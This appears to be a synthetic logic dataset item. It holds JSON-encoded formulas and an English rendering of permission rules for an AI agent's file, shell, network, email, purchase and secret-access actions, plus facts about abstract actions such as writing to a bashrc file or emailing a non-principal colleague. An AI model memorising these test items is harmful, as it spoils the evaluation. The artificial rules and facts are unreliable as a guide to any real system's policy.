        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_hosts"
            ]
          ]
        ]
      }
    },
    {
      "id": "record015",
      "span": [
        4630,
        4656
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_hosts"
            ]
          ]
        ]
      }
    },
    {
      "id": "record016",
      "span": [
        4656,
        4697
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "binary",
            "resides_in",
            [
              "const",
              "f_bashrc"
            ],
            [
              "const",
              "workspace"
            ]
          ]
        ]
      }
    },
    {
      "id": "record017",
      "span": [
        4697,
        4729
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_bashrc"
            ]
          ]
        ]
      }
    },
    {
      "id": "record018",
      "span": [
        4729,
        4756
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_bashrc"
            ]
          ]
        ]
      }
    },
    {
      "id": "record019",
      "span": [
        4756,
        4794
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "binary",
            "resides_in",
            [
              "const",
              "f_ssh"
            ],
            [
              "const",
              "workspace"
            ]
          ]
        ]
      }
    },
    {
      "id": "record020",
      "span": [
        4794,
        4819
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "confidential",
          [
            "const",
            "f_ssh"
          ]
        ]
      }
    },
    {
      "id": "record021",
      "span": [
        4819,
        4843
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_ssh"
            ]
          ]
        ]
      }
    },
    {
      "id": "record022",
      "span": [
        4843,
        4883
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "binary",
            "resides_in",
            [
              "const",
              "f_other"
            ],
            [
              "const",
              "workspace"
            ]
          ]
        ]
      }
    },
    {
      "id": "record023",
      "span": [
        4883,
        4914
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_other"
            ]
          ]
        ]
      }
    },
    {
      "id": "record024",
      "span": [
        4914,
        4936
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "tracked",
          [
            "const",
            "f_other"
          ]
        ]
      }
    },
    {
      "id": "record025",
      "span": [
        4936,
        4975
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "binary",
            "resides_in",
            [
              "const",
              "f_cron"
            ],
            [
              "const",
              "workspace"
            ]
          ]
        ]
      }
    },
    {
      "id": "record026",
      "span": [
        4975,
        5005
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_cron"
            ]
          ]
        ]
      }
    },
    {
      "id": "record027",
      "span": [
        5005,
        5030
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_cron"
            ]
          ]
        ]
      }
    },
    {
      "id": "record028",
      "span": [
        5030,
        5060
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confidential",
            [
              "const",
              "f_link"
            ]
          ]
        ]
      }
    },
    {
      "id": "record029",
      "span": [
        5060,
        5085
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "tracked",
            [
              "const",
              "f_link"
            ]
          ]
        ]
      }
    },
    {
      "id": "record030",
      "span": [
        5085,
        5110
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "allowlisted",
          [
            "const",
            "h_pypi"
          ]
        ]
      }
    },
    {
      "id": "record031",
      "span": [
        5110,
        5137
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "allowlisted",
          [
            "const",
            "h_github"
          ]
        ]
      }
    },
    {
      "id": "record032",
      "span": [
        5137,
        5167
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "allowlisted",
            [
              "const",
              "h_paste"
            ]
          ]
        ]
      }
    },
    {
      "id": "record033",
      "span": [
        5167,
        5199
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "allowlisted",
            [
              "const",
              "h_weather"
            ]
          ]
        ]
      }
    },
    {
      "id": "record034",
      "span": [
        5199,
        5230
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "allowlisted",
            [
              "const",
              "h_debian"
            ]
          ]
        ]
      }
    },
    {
      "id": "record035",
      "span": [
        5230,
        5253
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "principal",
          [
            "const",
            "p_user"
          ]
        ]
      }
    },
    {
      "id": "record036",
      "span": [
        5253,
        5285
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "principal",
            [
              "const",
              "p_colleague"
            ]
          ]
        ]
      }
    },
    {
      "id": "record037",
      "span": [
        5285,
        5312
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "principal",
            [
              "const",
              "p_list"
            ]
          ]
        ]
      }
    },
    {
      "id": "record038",
      "span": [
        5312,
        5347
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "tool",
          [
            "const",
            "a10"
          ],
          [
            "const",
            "write_file"
          ]
        ]
      }
    },
    {
      "id": "record039",
      "span": [
        5347,
        5420
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "reads",
              [
                "const",
                "a10"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record040",
      "span": [
        5420,
        5443
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "writes",
          [
            "const",
            "a10"
          ],
          [
            "const",
            "f_main"
          ]
        ]
      }
    },
    {
      "id": "record041",
      "span": [
        5443,
        5468
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "writes",
          [
            "const",
            "a10"
          ],
          [
            "const",
            "f_bashrc"
          ]
        ]
      }
    },
    {
      "id": "record042",
      "span": [
        5468,
        5592
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "forall",
          "file",
          [
            "implies",
            [
              "binary",
              "writes",
              [
                "const",
                "a10"
              ],
              [
                "var",
                0
              ]
            ],
            [
              "or",
              [
                "eq",
                [
                  "var",
                  0
                ],
                [
                  "const",
                  "f_main"
                ]
              ],
              [
                "eq",
                [
                  "var",
                  0
                ],
                [
                  "const",
                  "f_bashrc"
                ]
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record043",
      "span": [
        5592,
        5667
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "deletes",
              [
                "const",
                "a10"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record044",
      "span": [
        5667,
        5743
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "host",
            [
              "binary",
              "contacts",
              [
                "const",
                "a10"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record045",
      "span": [
        5743,
        5823
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "person",
            [
              "binary",
              "messages",
              [
                "const",
                "a10"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record046",
      "span": [
        5823,
        5904
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "secret",
            [
              "binary",
              "discloses",
              [
                "const",
                "a10"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record047",
      "span": [
        5904,
        5928
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confirmed",
            [
              "const",
              "a10"
            ]
          ]
        ]
      }
    },
    {
      "id": "record048",
      "span": [
        5928,
        5953
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "privileged",
            [
              "const",
              "a10"
            ]
          ]
        ]
      }
    },
    {
      "id": "record049",
      "span": [
        5953,
        5976
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "reported",
            [
              "const",
              "a10"
            ]
          ]
        ]
      }
    },
    {
      "id": "record050",
      "span": [
        5976,
        6012
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "tool",
          [
            "const",
            "a13"
          ],
          [
            "const",
            "delete_file"
          ]
        ]
      }
    },
    {
      "id": "record051",
      "span": [
        6012,
        6085
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "reads",
              [
                "const",
                "a13"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record052",
      "span": [
        6085,
        6159
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "writes",
              [
                "const",
                "a13"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record053",
      "span": [
        6159,
        6185
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "deletes",
          [
            "const",
            "a13"
          ],
          [
            "const",
            "f_readme"
          ]
        ]
      }
    },
    {
      "id": "record054",
      "span": [
        6185,
        6257
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "forall",
          "file",
          [
            "implies",
            [
              "binary",
              "deletes",
              [
                "const",
                "a13"
              ],
              [
                "var",
                0
              ]
            ],
            [
              "eq",
              [
                "var",
                0
              ],
              [
                "const",
                "f_readme"
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record055",
      "span": [
        6257,
        6333
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "host",
            [
              "binary",
              "contacts",
              [
                "const",
                "a13"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record056",
      "span": [
        6333,
        6413
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "person",
            [
              "binary",
              "messages",
              [
                "const",
                "a13"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record057",
      "span": [
        6413,
        6494
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "secret",
            [
              "binary",
              "discloses",
              [
                "const",
                "a13"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record058",
      "span": [
        6494,
        6518
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confirmed",
            [
              "const",
              "a13"
            ]
          ]
        ]
      }
    },
    {
      "id": "record059",
      "span": [
        6518,
        6543
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "privileged",
            [
              "const",
              "a13"
            ]
          ]
        ]
      }
    },
    {
      "id": "record060",
      "span": [
        6543,
        6566
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "reported",
            [
              "const",
              "a13"
            ]
          ]
        ]
      }
    },
    {
      "id": "record061",
      "span": [
        6566,
        6601
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "tool",
          [
            "const",
            "a25"
          ],
          [
            "const",
            "send_email"
          ]
        ]
      }
    },
    {
      "id": "record062",
      "span": [
        6601,
        6674
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "reads",
              [
                "const",
                "a25"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record063",
      "span": [
        6674,
        6748
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "writes",
              [
                "const",
                "a25"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record064",
      "span": [
        6748,
        6823
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "deletes",
              [
                "const",
                "a25"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record065",
      "span": [
        6823,
        6899
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "host",
            [
              "binary",
              "contacts",
              [
                "const",
                "a25"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record066",
      "span": [
        6899,
        6924
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "messages",
          [
            "const",
            "a25"
          ],
          [
            "const",
            "p_user"
          ]
        ]
      }
    },
    {
      "id": "record067",
      "span": [
        6924,
        6999
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "forall",
          "person",
          [
            "implies",
            [
              "binary",
              "messages",
              [
                "const",
                "a25"
              ],
              [
                "var",
                0
              ]
            ],
            [
              "eq",
              [
                "var",
                0
              ],
              [
                "const",
                "p_user"
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record068",
      "span": [
        6999,
        7080
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "secret",
            [
              "binary",
              "discloses",
              [
                "const",
                "a25"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record069",
      "span": [
        7080,
        7104
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confirmed",
            [
              "const",
              "a25"
            ]
          ]
        ]
      }
    },
    {
      "id": "record070",
      "span": [
        7104,
        7129
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "privileged",
            [
              "const",
              "a25"
            ]
          ]
        ]
      }
    },
    {
      "id": "record071",
      "span": [
        7129,
        7152
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "reported",
            [
              "const",
              "a25"
            ]
          ]
        ]
      }
    },
    {
      "id": "record072",
      "span": [
        7152,
        7187
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "tool",
          [
            "const",
            "a26"
          ],
          [
            "const",
            "send_email"
          ]
        ]
      }
    },
    {
      "id": "record073",
      "span": [
        7187,
        7260
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "reads",
              [
                "const",
                "a26"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record074",
      "span": [
        7260,
        7334
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "writes",
              [
                "const",
                "a26"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record075",
      "span": [
        7334,
        7409
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "deletes",
              [
                "const",
                "a26"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record076",
      "span": [
        7409,
        7485
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "host",
            [
              "binary",
              "contacts",
              [
                "const",
                "a26"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record077",
      "span": [
        7485,
        7515
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "messages",
          [
            "const",
            "a26"
          ],
          [
            "const",
            "p_colleague"
          ]
        ]
      }
    },
    {
      "id": "record078",
      "span": [
        7515,
        7595
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "forall",
          "person",
          [
            "implies",
            [
              "binary",
              "messages",
              [
                "const",
                "a26"
              ],
              [
                "var",
                0
              ]
            ],
            [
              "eq",
              [
                "var",
                0
              ],
              [
                "const",
                "p_colleague"
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record079",
      "span": [
        7595,
        7676
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "secret",
            [
              "binary",
              "discloses",
              [
                "const",
                "a26"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record080",
      "span": [
        7676,
        7700
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "confirmed",
            [
              "const",
              "a26"
            ]
          ]
        ]
      }
    },
    {
      "id": "record081",
      "span": [
        7700,
        7725
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "privileged",
            [
              "const",
              "a26"
            ]
          ]
        ]
      }
    },
    {
      "id": "record082",
      "span": [
        7725,
        7748
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "reported",
            [
              "const",
              "a26"
            ]
          ]
        ]
      }
    },
    {
      "id": "record083",
      "span": [
        7748,
        7783
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "tool",
          [
            "const",
            "a27"
          ],
          [
            "const",
            "send_email"
          ]
        ]
      }
    },
    {
      "id": "record084",
      "span": [
        7783,
        7856
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "reads",
              [
                "const",
                "a27"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record085",
      "span": [
        7856,
        7930
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "writes",
              [
                "const",
                "a27"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record086",
      "span": [
        7930,
        8005
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "file",
            [
              "binary",
              "deletes",
              [
                "const",
                "a27"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record087",
      "span": [
        8005,
        8081
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "host",
            [
              "binary",
              "contacts",
              [
                "const",
                "a27"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record088",
      "span": [
        8081,
        8111
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "binary",
          "messages",
          [
            "const",
            "a27"
          ],
          [
            "const",
            "p_colleague"
          ]
        ]
      }
    },
    {
      "id": "record089",
      "span": [
        8111,
        8191
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "forall",
          "person",
          [
            "implies",
            [
              "binary",
              "messages",
              [
                "const",
                "a27"
              ],
              [
                "var",
                0
              ]
            ],
            [
              "eq",
              [
                "var",
                0
              ],
              [
                "const",
                "p_colleague"
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record090",
      "span": [
        8191,
        8272
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "exists",
            "secret",
            [
              "binary",
              "discloses",
              [
                "const",
                "a27"
              ],
              [
                "var",
                0
              ]
            ]
          ]
        ]
      }
    },
    {
      "id": "record091",
      "span": [
        8272,
        8292
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "unary",
          "confirmed",
          [
            "const",
            "a27"
          ]
        ]
      }
    },
    {
      "id": "record092",
      "span": [
        8292,
        8317
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "privileged",
            [
              "const",
              "a27"
            ]
          ]
        ]
      }
    },
    {
      "id": "record093",
      "span": [
        8317,
        8340
      ],
      "kind": "asserted",
      "meaning": "specified",
      "support": "observation",
      "content": {
        "ast": [
          "not",
          [
            "unary",
            "reported",
            [
              "const",
              "a27"
            ]
          ]
        ]
      }
    }
  ]
}
---
Rule 1. Every action may be performed, if there is a file such that both that action reads that file and that file resides in workspace.
Rule 2. Every action may be performed, if there is a file such that both that action reads that file and that action is confirmed.
Rule 3. Every action may be performed, if there is a file such that both that action writes that file and that file resides in workspace.
Rule 4. Every action may be performed, if there is a file such that both that action deletes that file and that file resides in workspace.
Rule 5. Every action may be performed, if both the tool of that action is shell and that action is readonly.
Rule 6. Every action may be performed, if both the tool of that action is shell and that action is confirmed.
Rule 7. Every action may be performed, if there is a host such that both that action contacts that host and that host is allowlisted.
Rule 8. Every action may be performed, if there is a host such that both that action contacts that host and that action is confirmed.
Rule 9. Every action may be performed, if there is a person such that both that action messages that person and that person is principal.
Rule 10. Every action may be performed, if both the tool of that action is purchase and that action is confirmed.
Rule 11. Every action may be performed, if both the tool of that action is "get_secret" and that action is confirmed.
Rule 12. Every action may be performed, if there is a file such that both that action reads that file and that file is confidential, unless that action is not confirmed.
Rule 13 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a file such that both that action reads that file and that file does not reside in workspace, unless that action is confirmed.
Rule 14 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a file such that both that action writes that file and that file does not reside in workspace.
Rule 15 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a file such that both that action deletes that file and that file does not reside in workspace.
Rule 16 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a file such that both that action deletes that file and that file is not tracked, unless that action is confirmed.
Rule 17 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if both the tool of that action is shell and that action is not readonly, unless that action is confirmed.
Rule 18 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a host such that both that action contacts that host and that host is not allowlisted, unless that action is confirmed.
Rule 19 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a person such that both that action messages that person and that person is not principal, unless that action is confirmed.
Rule 20 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if the tool of that action is purchase, unless that action is confirmed.
Rule 21 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if both the tool of that action is purchase and that action is not affordable.
Rule 22 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if that action is privileged.
Rule 23 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a secret such that that action discloses that secret.
Rule 24 (exception to rules 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12). Every action must not be performed, if there is a file such that both that action reads that file and that file is confidential.
Rule 25. Every action must be reported to the user, if there is a file such that that action deletes that file.
Rule 26. Every action must be reported to the user, if the tool of that action is purchase.
"f_main" resides in workspace.
"f_main" is not confidential.
"f_main" is tracked.
"f_readme" resides in workspace.
"f_readme" is not confidential.
"f_readme" is tracked.
"f_build" resides in workspace.
"f_build" is not confidential.
"f_build" is not tracked.
"f_env" resides in workspace.
"f_env" is confidential.
"f_env" is not tracked.
"f_hosts" does not reside in workspace.
"f_hosts" is not confidential.
"f_hosts" is not tracked.
"f_bashrc" does not reside in workspace.
"f_bashrc" is not confidential.
"f_bashrc" is not tracked.
"f_ssh" does not reside in workspace.
"f_ssh" is confidential.
"f_ssh" is not tracked.
"f_other" does not reside in workspace.
"f_other" is not confidential.
"f_other" is tracked.
"f_cron" does not reside in workspace.
"f_cron" is not confidential.
"f_cron" is not tracked.
"f_link" is not confidential.
"f_link" is not tracked.
"h_pypi" is allowlisted.
"h_github" is allowlisted.
"h_paste" is not allowlisted.
"h_weather" is not allowlisted.
"h_debian" is not allowlisted.
"p_user" is principal.
"p_colleague" is not principal.
"p_list" is not principal.
The tool of "a10" is "write_file".
It is not the case that there is a file such that "a10" reads that file.
"a10" writes "f_main".
"a10" writes "f_bashrc".
For every file that "a10" writes, either that file is the same as "f_main" or that file is the same as "f_bashrc", or both.
It is not the case that there is a file such that "a10" deletes that file.
It is not the case that there is a host such that "a10" contacts that host.
It is not the case that there is a person such that "a10" messages that person.
It is not the case that there is a secret such that "a10" discloses that secret.
"a10" is not confirmed.
"a10" is not privileged.
"a10" is not reported.
The tool of "a13" is "delete_file".
It is not the case that there is a file such that "a13" reads that file.
It is not the case that there is a file such that "a13" writes that file.
"a13" deletes "f_readme".
For every file that "a13" deletes, that file is the same as "f_readme".
It is not the case that there is a host such that "a13" contacts that host.
It is not the case that there is a person such that "a13" messages that person.
It is not the case that there is a secret such that "a13" discloses that secret.
"a13" is not confirmed.
"a13" is not privileged.
"a13" is not reported.
The tool of "a25" is "send_email".
It is not the case that there is a file such that "a25" reads that file.
It is not the case that there is a file such that "a25" writes that file.
It is not the case that there is a file such that "a25" deletes that file.
It is not the case that there is a host such that "a25" contacts that host.
"a25" messages "p_user".
For every person that "a25" messages, that person is the same as "p_user".
It is not the case that there is a secret such that "a25" discloses that secret.
"a25" is not confirmed.
"a25" is not privileged.
"a25" is not reported.
The tool of "a26" is "send_email".
It is not the case that there is a file such that "a26" reads that file.
It is not the case that there is a file such that "a26" writes that file.
It is not the case that there is a file such that "a26" deletes that file.
It is not the case that there is a host such that "a26" contacts that host.
"a26" messages "p_colleague".
For every person that "a26" messages, that person is the same as "p_colleague".
It is not the case that there is a secret such that "a26" discloses that secret.
"a26" is not confirmed.
"a26" is not privileged.
"a26" is not reported.
The tool of "a27" is "send_email".
It is not the case that there is a file such that "a27" reads that file.
It is not the case that there is a file such that "a27" writes that file.
It is not the case that there is a file such that "a27" deletes that file.
It is not the case that there is a host such that "a27" contacts that host.
"a27" messages "p_colleague".
For every person that "a27" messages, that person is the same as "p_colleague".
It is not the case that there is a secret such that "a27" discloses that secret.
"a27" is confirmed.
"a27" is not privileged.
"a27" is not reported.
